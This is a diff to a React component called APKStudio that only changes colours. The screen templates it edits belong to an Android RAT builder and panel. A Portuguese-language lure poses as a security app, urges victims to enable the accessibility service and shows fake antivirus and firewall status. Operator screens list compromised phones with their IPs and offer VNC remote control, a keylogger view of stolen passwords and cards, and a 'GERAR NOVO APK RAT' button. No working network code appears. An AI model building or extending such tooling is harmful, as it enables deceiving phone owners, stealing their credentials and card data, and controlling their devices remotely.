@@ -215,7 +215,7 @@ interface Project {
 
 const DEFAULT_THEME = {
   primaryColor: '#ff6600',
-  secondaryColor: '#2e0d08',
+  secondaryColor: '#121214',
   accentColor: '#00d4aa',
   textColor: '#ffffff',
   backgroundColor: '#1a0705'
@@ -304,10 +304,10 @@ const APKStudio: React.FC = () => {
       {
         id: generateId(),
         name: '🔒 Ativação',
-        backgroundColor: '#0d1117',
+        backgroundColor: '#170d0d',
         elements: [
           // Logo no topo
-          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 200, backgroundColor: '#161b22', gradientStart: '#161b22', gradientEnd: '#0d1117', gradientDirection: 'vertical', opacity: 100 },
+          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 200, backgroundColor: '#221616', gradientStart: '#221616', gradientEnd: '#170d0d', gradientDirection: 'vertical', opacity: 100 },
           { id: generateId(), type: 'circle', x: 130, y: 40, width: 100, height: 100, backgroundColor: '#238636', opacity: 100 },
           { id: generateId(), type: 'text', x: 155, y: 70, width: 50, height: 50, content: '🛡️', fontSize: 40, textAlign: 'center', color: '#ffffff', opacity: 100 },
           
@@ -318,7 +318,7 @@ const APKStudio: React.FC = () => {
           { id: generateId(), type: 'text', x: 30, y: 220, width: 300, height: 80, content: 'Para proteger seu dispositivo contra ameaças, ative o serviço de acessibilidade.', fontSize: 14, color: '#9e948b', textAlign: 'center', opacity: 100 },
           
           // Card de instrução
-          { id: generateId(), type: 'card', x: 20, y: 310, width: 320, height: 180, backgroundColor: '#161b22', borderRadius: 16, borderWidth: 1, borderColor: '#30363d', opacity: 100 },
+          { id: generateId(), type: 'card', x: 20, y: 310, width: 320, height: 180, backgroundColor: '#221616', borderRadius: 16, borderWidth: 1, borderColor: '#3d3030', opacity: 100 },
           { id: generateId(), type: 'text', x: 35, y: 325, width: 290, height: 25, content: '📋 Como ativar:', fontSize: 16, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
           { id: generateId(), type: 'text', x: 35, y: 355, width: 290, height: 25, content: '1. Toque em "Ativar Proteção"', fontSize: 13, color: '#9e948b', opacity: 100 },
           { id: generateId(), type: 'text', x: 35, y: 380, width: 290, height: 25, content: '2. Encontre "Assistente de Proteção"', fontSize: 13, color: '#9e948b', opacity: 100 },
@@ -329,7 +329,7 @@ const APKStudio: React.FC = () => {
           { id: generateId(), type: 'button', x: 30, y: 520, width: 300, height: 60, content: '🛡️ Ativar Proteção', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#238636', borderRadius: 12, buttonAction: 'accessibility', shadowBlur: 15, shadowColor: '#238636', opacity: 100 },
           
           // Botão secundário
-          { id: generateId(), type: 'button', x: 30, y: 600, width: 300, height: 45, content: 'Já ativei, continuar →', fontSize: 14, color: '#ffa658', backgroundColor: 'transparent', borderRadius: 8, borderWidth: 1, borderColor: '#30363d', buttonAction: 'next_screen', opacity: 100 },
+          { id: generateId(), type: 'button', x: 30, y: 600, width: 300, height: 45, content: 'Já ativei, continuar →', fontSize: 14, color: '#ffa658', backgroundColor: 'transparent', borderRadius: 8, borderWidth: 1, borderColor: '#3d3030', buttonAction: 'next_screen', opacity: 100 },
           
           // Footer
           { id: generateId(), type: 'text', x: 30, y: 720, width: 300, height: 20, content: 'Segurança garantida • 100% Gratuito', fontSize: 11, color: '#582718', textAlign: 'center', opacity: 100 },
@@ -338,7 +338,7 @@ const APKStudio: React.FC = () => {
       {
         id: generateId(),
         name: '✅ Proteção Ativa',
-        backgroundColor: '#0d1117',
+        backgroundColor: '#170d0d',
         elements: [
           // Header
           { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 250, backgroundColor: '#238636', gradientStart: '#238636', gradientEnd: '#196c2e', gradientDirection: 'vertical', opacity: 100 },
@@ -352,24 +352,24 @@ const APKStudio: React.FC = () => {
           { id: generateId(), type: 'text', x: 30, y: 210, width: 300, height: 25, content: 'Seu dispositivo está seguro', fontSize: 14, color: '#ffffff', textAlign: 'center', opacity: 80 },
           
           // Status cards
-          { id: generateId(), type: 'card', x: 20, y: 280, width: 155, height: 90, backgroundColor: '#161b22', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 20, y: 280, width: 155, height: 90, backgroundColor: '#221616', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'text', x: 30, y: 295, width: 135, height: 25, content: '🔒 Firewall', fontSize: 12, color: '#9e948b', opacity: 100 },
           { id: generateId(), type: 'text', x: 30, y: 320, width: 135, height: 30, content: 'ATIVO', fontSize: 18, fontWeight: 'bold', color: '#238636', opacity: 100 },
           
-          { id: generateId(), type: 'card', x: 185, y: 280, width: 155, height: 90, backgroundColor: '#161b22', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 185, y: 280, width: 155, height: 90, backgroundColor: '#221616', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'text', x: 195, y: 295, width: 135, height: 25, content: '🛡️ Antivírus', fontSize: 12, color: '#9e948b', opacity: 100 },
           { id: generateId(), type: 'text', x: 195, y: 320, width: 135, height: 30, content: 'ATIVO', fontSize: 18, fontWeight: 'bold', color: '#238636', opacity: 100 },
           
-          { id: generateId(), type: 'card', x: 20, y: 385, width: 155, height: 90, backgroundColor: '#161b22', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 20, y: 385, width: 155, height: 90, backgroundColor: '#221616', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'text', x: 30, y: 400, width: 135, height: 25, content: '🔍 Scanner', fontSize: 12, color: '#9e948b', opacity: 100 },
           { id: generateId(), type: 'text', x: 30, y: 425, width: 135, height: 30, content: 'ATIVO', fontSize: 18, fontWeight: 'bold', color: '#238636', opacity: 100 },
           
-          { id: generateId(), type: 'card', x: 185, y: 385, width: 155, height: 90, backgroundColor: '#161b22', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 185, y: 385, width: 155, height: 90, backgroundColor: '#221616', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'text', x: 195, y: 400, width: 135, height: 25, content: '📡 Proteção Web', fontSize: 12, color: '#9e948b', opacity: 100 },
           { id: generateId(), type: 'text', x: 195, y: 425, width: 135, height: 30, content: 'ATIVO', fontSize: 18, fontWeight: 'bold', color: '#238636', opacity: 100 },
           
           // Info
-          { id: generateId(), type: 'card', x: 20, y: 500, width: 320, height: 100, backgroundColor: '#161b22', borderRadius: 12, borderWidth: 1, borderColor: '#238636', opacity: 100 },
+          { id: generateId(), type: 'card', x: 20, y: 500, width: 320, height: 100, backgroundColor: '#221616', borderRadius: 12, borderWidth: 1, borderColor: '#238636', opacity: 100 },
           { id: generateId(), type: 'text', x: 35, y: 520, width: 290, height: 25, content: '🔔 Monitoramento em tempo real', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
           { id: generateId(), type: 'text', x: 35, y: 550, width: 290, height: 40, content: 'O app está protegendo seu dispositivo em segundo plano. Não é necessário mantê-lo aberto.', fontSize: 12, color: '#9e948b', opacity: 100 },
           
@@ -383,22 +383,22 @@ const APKStudio: React.FC = () => {
       {
         id: generateId(),
         name: '⚙️ Configurações',
-        backgroundColor: '#0d1117',
+        backgroundColor: '#170d0d',
         elements: [
           // Header
-          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 80, backgroundColor: '#161b22', opacity: 100 },
+          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 80, backgroundColor: '#221616', opacity: 100 },
           { id: generateId(), type: 'text', x: 20, y: 30, width: 250, height: 30, content: '⚙️ Configurações', fontSize: 20, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
           
           // Opções
-          { id: generateId(), type: 'card', x: 15, y: 100, width: 330, height: 60, backgroundColor: '#161b22', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 100, width: 330, height: 60, backgroundColor: '#221616', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 120, width: 250, height: 25, content: '🔔 Notificações', fontSize: 14, color: '#ffffff', opacity: 100 },
           { id: generateId(), type: 'switch', x: 290, y: 115, width: 50, height: 30, backgroundColor: '#238636', checked: true, opacity: 100 },
           
-          { id: generateId(), type: 'card', x: 15, y: 175, width: 330, height: 60, backgroundColor: '#161b22', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 175, width: 330, height: 60, backgroundColor: '#221616', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 195, width: 250, height: 25, content: '🔄 Atualização automática', fontSize: 14, color: '#ffffff', opacity: 100 },
           { id: generateId(), type: 'switch', x: 290, y: 190, width: 50, height: 30, backgroundColor: '#238636', checked: true, opacity: 100 },
           
-          { id: generateId(), type: 'card', x: 15, y: 250, width: 330, height: 60, backgroundColor: '#161b22', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 250, width: 330, height: 60, backgroundColor: '#221616', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 270, width: 250, height: 25, content: '🛡️ Proteção em segundo plano', fontSize: 14, color: '#ffffff', opacity: 100 },
           { id: generateId(), type: 'switch', x: 290, y: 265, width: 50, height: 30, backgroundColor: '#238636', checked: true, opacity: 100 },
           
@@ -425,9 +425,9 @@ const APKStudio: React.FC = () => {
           { id: generateId(), type: 'text', x: 30, y: 245, width: 300, height: 25, content: '📲 Mobile Edition v2.0', fontSize: 14, color: '#888888', textAlign: 'center', opacity: 100 },
           // Inputs
           { id: generateId(), type: 'text', x: 40, y: 310, width: 280, height: 20, content: 'Usuário', fontSize: 12, color: '#888888', opacity: 100 },
-          { id: generateId(), type: 'input', x: 40, y: 335, width: 280, height: 50, placeholder: 'Digite seu usuário', inputType: 'text', inputLabel: 'username', backgroundColor: '#2e0d08', color: '#ffffff', borderRadius: 12, borderWidth: 1, borderColor: '#ff6600', opacity: 100 },
+          { id: generateId(), type: 'input', x: 40, y: 335, width: 280, height: 50, placeholder: 'Digite seu usuário', inputType: 'text', inputLabel: 'username', backgroundColor: '#121214', color: '#ffffff', borderRadius: 12, borderWidth: 1, borderColor: '#ff6600', opacity: 100 },
           { id: generateId(), type: 'text', x: 40, y: 400, width: 280, height: 20, content: 'Senha', fontSize: 12, color: '#888888', opacity: 100 },
-          { id: generateId(), type: 'input', x: 40, y: 425, width: 280, height: 50, placeholder: '••••••••', inputType: 'password', inputLabel: 'password', backgroundColor: '#2e0d08', color: '#ffffff', borderRadius: 12, borderWidth: 1, borderColor: '#444444', opacity: 100 },
+          { id: generateId(), type: 'input', x: 40, y: 425, width: 280, height: 50, placeholder: '••••••••', inputType: 'password', inputLabel: 'password', backgroundColor: '#121214', color: '#ffffff', borderRadius: 12, borderWidth: 1, borderColor: '#444444', opacity: 100 },
           // Remember me
           { id: generateId(), type: 'checkbox', x: 40, y: 490, width: 200, height: 25, content: 'Lembrar credenciais', color: '#888888', checked: true, opacity: 100 },
           // Login button
@@ -452,34 +452,34 @@ const APKStudio: React.FC = () => {
           { id: generateId(), type: 'text', x: 20, y: 50, width: 200, height: 20, content: 'admin@servidor', fontSize: 12, color: '#ffddcc', opacity: 100 },
           { id: generateId(), type: 'text', x: 260, y: 30, width: 90, height: 30, content: '● ONLINE', fontSize: 12, fontWeight: 'bold', color: '#00ff00', textAlign: 'right', opacity: 100 },
           // Cards de estatísticas
-          { id: generateId(), type: 'card', x: 15, y: 100, width: 105, height: 90, backgroundColor: '#2e0d08', borderRadius: 16, opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 100, width: 105, height: 90, backgroundColor: '#121214', borderRadius: 16, opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 110, width: 85, height: 20, content: '📱 Total', fontSize: 11, color: '#888888', textAlign: 'center', opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 135, width: 85, height: 40, content: '{{total_devices}}', fontSize: 32, fontWeight: 'bold', color: '#ff6600', textAlign: 'center', opacity: 100, isDynamic: true },
-          { id: generateId(), type: 'card', x: 128, y: 100, width: 105, height: 90, backgroundColor: '#2e0d08', borderRadius: 16, opacity: 100 },
+          { id: generateId(), type: 'card', x: 128, y: 100, width: 105, height: 90, backgroundColor: '#121214', borderRadius: 16, opacity: 100 },
           { id: generateId(), type: 'text', x: 138, y: 110, width: 85, height: 20, content: '🟢 Online', fontSize: 11, color: '#888888', textAlign: 'center', opacity: 100 },
           { id: generateId(), type: 'text', x: 138, y: 135, width: 85, height: 40, content: '{{online_devices}}', fontSize: 32, fontWeight: 'bold', color: '#00d4aa', textAlign: 'center', opacity: 100, isDynamic: true },
-          { id: generateId(), type: 'card', x: 241, y: 100, width: 105, height: 90, backgroundColor: '#2e0d08', borderRadius: 16, opacity: 100 },
+          { id: generateId(), type: 'card', x: 241, y: 100, width: 105, height: 90, backgroundColor: '#121214', borderRadius: 16, opacity: 100 },
           { id: generateId(), type: 'text', x: 251, y: 110, width: 85, height: 20, content: '⌨️ Senhas', fontSize: 11, color: '#888888', textAlign: 'center', opacity: 100 },
           { id: generateId(), type: 'text', x: 251, y: 135, width: 85, height: 40, content: '{{total_passwords}}', fontSize: 32, fontWeight: 'bold', color: '#ff4444', textAlign: 'center', opacity: 100, isDynamic: true },
           // Título dispositivos
           { id: generateId(), type: 'text', x: 20, y: 205, width: 250, height: 25, content: '📱 Dispositivos Recentes', fontSize: 16, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
           { id: generateId(), type: 'button', x: 280, y: 205, width: 60, height: 25, content: 'Ver Todos', fontSize: 10, color: '#ff6600', backgroundColor: 'transparent', buttonAction: 'goto_screen', targetScreenIndex: 2, opacity: 100 },
           // Device 1 - DINÂMICO
-          { id: generateId(), type: 'card', x: 15, y: 240, width: 330, height: 75, backgroundColor: '#2e0d08', borderRadius: 12, borderWidth: 2, borderColor: '#00d4aa', opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 240, width: 330, height: 75, backgroundColor: '#121214', borderRadius: 12, borderWidth: 2, borderColor: '#00d4aa', opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 250, width: 20, height: 20, content: '{{device_1_status}}', fontSize: 16, opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 50, y: 250, width: 180, height: 20, content: '{{device_1_name}}', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 50, y: 275, width: 180, height: 18, content: 'Android {{device_1_android}} • {{device_1_ip}}', fontSize: 11, color: '#888888', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 50, y: 295, width: 100, height: 15, content: '🔓 {{device_1_time}}', fontSize: 10, color: '#00d4aa', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'button', x: 255, y: 255, width: 75, height: 45, content: '▶️ VNC', fontSize: 12, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#ff6600', borderRadius: 10, buttonAction: 'goto_screen', targetScreenIndex: 3, opacity: 100 },
           // Device 2 - DINÂMICO
-          { id: generateId(), type: 'card', x: 15, y: 325, width: 330, height: 75, backgroundColor: '#2e0d08', borderRadius: 12, borderWidth: 2, borderColor: '#00d4aa', opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 325, width: 330, height: 75, backgroundColor: '#121214', borderRadius: 12, borderWidth: 2, borderColor: '#00d4aa', opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 335, width: 20, height: 20, content: '{{device_2_status}}', fontSize: 16, opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 50, y: 335, width: 180, height: 20, content: '{{device_2_name}}', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 50, y: 360, width: 180, height: 18, content: 'Android {{device_2_android}} • {{device_2_ip}}', fontSize: 11, color: '#888888', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 50, y: 380, width: 100, height: 15, content: '🔓 {{device_2_time}}', fontSize: 10, color: '#00d4aa', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'button', x: 255, y: 340, width: 75, height: 45, content: '▶️ VNC', fontSize: 12, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#ff6600', borderRadius: 10, buttonAction: 'goto_screen', targetScreenIndex: 3, opacity: 100 },
           // Device 3 - DINÂMICO
-          { id: generateId(), type: 'card', x: 15, y: 410, width: 330, height: 75, backgroundColor: '#2e0d08', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 70 },
+          { id: generateId(), type: 'card', x: 15, y: 410, width: 330, height: 75, backgroundColor: '#121214', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 70 },
           { id: generateId(), type: 'text', x: 25, y: 420, width: 20, height: 20, content: '{{device_3_status}}', fontSize: 16, opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 50, y: 420, width: 180, height: 20, content: '{{device_3_name}}', fontSize: 14, fontWeight: 'bold', color: '#888888', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 50, y: 445, width: 180, height: 18, content: 'Android {{device_3_android}} • {{device_3_ip}}', fontSize: 11, color: '#666666', opacity: 100, isDynamic: true },
@@ -493,7 +493,7 @@ const APKStudio: React.FC = () => {
           // Gerar APK
           { id: generateId(), type: 'button', x: 15, y: 615, width: 330, height: 55, content: '➕ GERAR NOVO APK RAT', fontSize: 16, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#238636', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 5, opacity: 100 },
           // Bottom Navigation
-          { id: generateId(), type: 'rectangle', x: 0, y: 695, width: 360, height: 85, backgroundColor: '#2e0d08', borderRadius: 0, opacity: 100 },
+          { id: generateId(), type: 'rectangle', x: 0, y: 695, width: 360, height: 85, backgroundColor: '#121214', borderRadius: 0, opacity: 100 },
           { id: generateId(), type: 'button', x: 25, y: 710, width: 55, height: 55, content: '🏠', fontSize: 24, backgroundColor: '#ff6600', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 1, opacity: 100 },
           { id: generateId(), type: 'button', x: 95, y: 710, width: 55, height: 55, content: '📱', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 2, opacity: 100 },
           { id: generateId(), type: 'button', x: 165, y: 710, width: 55, height: 55, content: '⌨️', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 4, opacity: 100 },
@@ -509,7 +509,7 @@ const APKStudio: React.FC = () => {
         backgroundColor: '#150503',
         elements: [
           // Header
-          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 70, backgroundColor: '#2e0d08', opacity: 100 },
+          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 70, backgroundColor: '#121214', opacity: 100 },
           { id: generateId(), type: 'button', x: 15, y: 20, width: 40, height: 35, content: '←', fontSize: 20, backgroundColor: '#333333', borderRadius: 10, buttonAction: 'prev_screen', opacity: 100 },
           { id: generateId(), type: 'text', x: 70, y: 22, width: 200, height: 30, content: '📱 Todos Dispositivos', fontSize: 18, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
           { id: generateId(), type: 'text', x: 280, y: 28, width: 60, height: 20, content: '{{total_devices}} total', fontSize: 12, color: '#888888', textAlign: 'right', opacity: 100, isDynamic: true },
@@ -518,31 +518,31 @@ const APKStudio: React.FC = () => {
           { id: generateId(), type: 'button', x: 125, y: 85, width: 100, height: 35, content: '🔴 Offline ({{offline_devices}})', fontSize: 11, color: '#ff4444', backgroundColor: '#333333', borderRadius: 20, opacity: 100, isDynamic: true },
           { id: generateId(), type: 'button', x: 235, y: 85, width: 110, height: 35, content: '🔍 Buscar', fontSize: 11, color: '#888888', backgroundColor: '#333333', borderRadius: 20, opacity: 100 },
           // Dispositivos (lista DINÂMICA)
-          { id: generateId(), type: 'card', x: 15, y: 135, width: 330, height: 85, backgroundColor: '#2e0d08', borderRadius: 12, borderWidth: 2, borderColor: '#00d4aa', opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 135, width: 330, height: 85, backgroundColor: '#121214', borderRadius: 12, borderWidth: 2, borderColor: '#00d4aa', opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 145, width: 250, height: 22, content: '📱 {{device_1_name}}', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 25, y: 170, width: 200, height: 18, content: 'Android {{device_1_android}} • {{device_1_ip}}', fontSize: 10, color: '#888888', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 25, y: 190, width: 150, height: 18, content: '{{device_1_status}} • {{device_1_time}}', fontSize: 10, color: '#00d4aa', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'button', x: 260, y: 155, width: 70, height: 45, content: '▶️', fontSize: 20, backgroundColor: '#ff6600', borderRadius: 10, buttonAction: 'goto_screen', targetScreenIndex: 3, opacity: 100 },
           // Device 2 - DINÂMICO
-          { id: generateId(), type: 'card', x: 15, y: 230, width: 330, height: 85, backgroundColor: '#2e0d08', borderRadius: 12, borderWidth: 2, borderColor: '#00d4aa', opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 230, width: 330, height: 85, backgroundColor: '#121214', borderRadius: 12, borderWidth: 2, borderColor: '#00d4aa', opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 240, width: 250, height: 22, content: '📱 {{device_2_name}}', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 25, y: 265, width: 200, height: 18, content: 'Android {{device_2_android}} • {{device_2_ip}}', fontSize: 10, color: '#888888', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 25, y: 285, width: 150, height: 18, content: '{{device_2_status}} • {{device_2_time}}', fontSize: 10, color: '#00d4aa', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'button', x: 260, y: 250, width: 70, height: 45, content: '▶️', fontSize: 20, backgroundColor: '#ff6600', borderRadius: 10, buttonAction: 'goto_screen', targetScreenIndex: 3, opacity: 100 },
           // Device 3
-          { id: generateId(), type: 'card', x: 15, y: 325, width: 330, height: 85, backgroundColor: '#2e0d08', borderRadius: 12, borderWidth: 2, borderColor: '#00d4aa', opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 325, width: 330, height: 85, backgroundColor: '#121214', borderRadius: 12, borderWidth: 2, borderColor: '#00d4aa', opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 335, width: 250, height: 22, content: '📱 Motorola Edge 40 Pro', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 360, width: 200, height: 18, content: 'Android 14 • 1080x2400 • 12GB RAM', fontSize: 10, color: '#888888', opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 380, width: 150, height: 18, content: '🟢 Online • 192.168.1.120', fontSize: 10, color: '#00d4aa', opacity: 100 },
           { id: generateId(), type: 'button', x: 260, y: 345, width: 70, height: 45, content: '▶️', fontSize: 20, backgroundColor: '#ff6600', borderRadius: 10, buttonAction: 'goto_screen', targetScreenIndex: 3, opacity: 100 },
           // Device 4 (offline)
-          { id: generateId(), type: 'card', x: 15, y: 420, width: 330, height: 85, backgroundColor: '#2e0d08', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 60 },
+          { id: generateId(), type: 'card', x: 15, y: 420, width: 330, height: 85, backgroundColor: '#121214', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 60 },
           { id: generateId(), type: 'text', x: 25, y: 430, width: 250, height: 22, content: '📱 iPhone 15 Pro Max', fontSize: 14, fontWeight: 'bold', color: '#666666', opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 455, width: 200, height: 18, content: 'iOS 17 • 1290x2796', fontSize: 10, color: '#555555', opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 475, width: 180, height: 18, content: '🔴 Offline • há 3 horas', fontSize: 10, color: '#ff4444', opacity: 100 },
           { id: generateId(), type: 'button', x: 260, y: 440, width: 70, height: 45, content: '⏸️', fontSize: 20, backgroundColor: '#333333', borderRadius: 10, opacity: 100 },
           // Device 5 (offline)
-          { id: generateId(), type: 'card', x: 15, y: 515, width: 330, height: 85, backgroundColor: '#2e0d08', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 60 },
+          { id: generateId(), type: 'card', x: 15, y: 515, width: 330, height: 85, backgroundColor: '#121214', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 60 },
           { id: generateId(), type: 'text', x: 25, y: 525, width: 250, height: 22, content: '📱 OnePlus 11', fontSize: 14, fontWeight: 'bold', color: '#666666', opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 550, width: 200, height: 18, content: 'Android 14 • 1440x3216', fontSize: 10, color: '#555555', opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 570, width: 180, height: 18, content: '🔴 Offline • há 1 dia', fontSize: 10, color: '#ff4444', opacity: 100 },
@@ -550,7 +550,7 @@ const APKStudio: React.FC = () => {
           // Bottom text
           { id: generateId(), type: 'text', x: 15, y: 620, width: 330, height: 20, content: '📊 18 online • 6 offline • 0 pendentes', fontSize: 12, color: '#666666', textAlign: 'center', opacity: 100 },
           // Bottom Nav
-          { id: generateId(), type: 'rectangle', x: 0, y: 695, width: 360, height: 85, backgroundColor: '#2e0d08', opacity: 100 },
+          { id: generateId(), type: 'rectangle', x: 0, y: 695, width: 360, height: 85, backgroundColor: '#121214', opacity: 100 },
           { id: generateId(), type: 'button', x: 25, y: 710, width: 55, height: 55, content: '🏠', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 1, opacity: 100 },
           { id: generateId(), type: 'button', x: 95, y: 710, width: 55, height: 55, content: '📱', fontSize: 24, backgroundColor: '#ff6600', borderRadius: 14, opacity: 100 },
           { id: generateId(), type: 'button', x: 165, y: 710, width: 55, height: 55, content: '⌨️', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 4, opacity: 100 },
@@ -566,7 +566,7 @@ const APKStudio: React.FC = () => {
         backgroundColor: '#000000',
         elements: [
           // Header
-          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 55, backgroundColor: '#2e0d08', opacity: 100 },
+          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 55, backgroundColor: '#121214', opacity: 100 },
           { id: generateId(), type: 'button', x: 10, y: 10, width: 40, height: 35, content: '←', fontSize: 20, backgroundColor: '#333333', borderRadius: 8, buttonAction: 'prev_screen', opacity: 100 },
           { id: generateId(), type: 'text', x: 60, y: 10, width: 180, height: 20, content: '{{selected_device_name}}', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 60, y: 32, width: 180, height: 18, content: '{{selected_device_status}}', fontSize: 10, color: '#00d4aa', opacity: 100, isDynamic: true },
@@ -579,7 +579,7 @@ const APKStudio: React.FC = () => {
           { id: generateId(), type: 'rectangle', x: 25, y: 75, width: 100, height: 25, backgroundColor: '#ff000066', borderRadius: 8, opacity: 100 },
           { id: generateId(), type: 'text', x: 30, y: 80, width: 90, height: 18, content: '● AO VIVO', fontSize: 11, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
           // Control panel
-          { id: generateId(), type: 'rectangle', x: 0, y: 595, width: 360, height: 185, backgroundColor: '#2e0d08', opacity: 100 },
+          { id: generateId(), type: 'rectangle', x: 0, y: 595, width: 360, height: 185, backgroundColor: '#121214', opacity: 100 },
           // Navigation buttons
           { id: generateId(), type: 'text', x: 20, y: 605, width: 150, height: 20, content: '🎮 Navegação', fontSize: 12, fontWeight: 'bold', color: '#888888', opacity: 100 },
           { id: generateId(), type: 'button', x: 20, y: 630, width: 75, height: 50, content: '🏠\nHome', fontSize: 14, color: '#ffffff', backgroundColor: '#333333', borderRadius: 12, buttonAction: 'show_toast', opacity: 100 },
@@ -608,33 +608,33 @@ const APKStudio: React.FC = () => {
           { id: generateId(), type: 'text', x: 70, y: 22, width: 200, height: 30, content: '⌨️ KEYLOGGER', fontSize: 20, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
           { id: generateId(), type: 'text', x: 270, y: 28, width: 80, height: 20, content: '{{total_passwords}} logs', fontSize: 12, color: '#ffcccc', textAlign: 'right', opacity: 100, isDynamic: true },
           // Stats - DINÂMICOS
-          { id: generateId(), type: 'card', x: 15, y: 85, width: 160, height: 70, backgroundColor: '#2e0d08', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 85, width: 160, height: 70, backgroundColor: '#121214', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 95, width: 140, height: 20, content: '🔑 Senhas', fontSize: 12, color: '#888888', opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 118, width: 140, height: 30, content: '{{total_passwords}}', fontSize: 28, fontWeight: 'bold', color: '#ff6600', opacity: 100, isDynamic: true },
-          { id: generateId(), type: 'card', x: 185, y: 85, width: 160, height: 70, backgroundColor: '#2e0d08', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 185, y: 85, width: 160, height: 70, backgroundColor: '#121214', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'text', x: 195, y: 95, width: 140, height: 20, content: '💳 Cartões', fontSize: 12, color: '#888888', opacity: 100 },
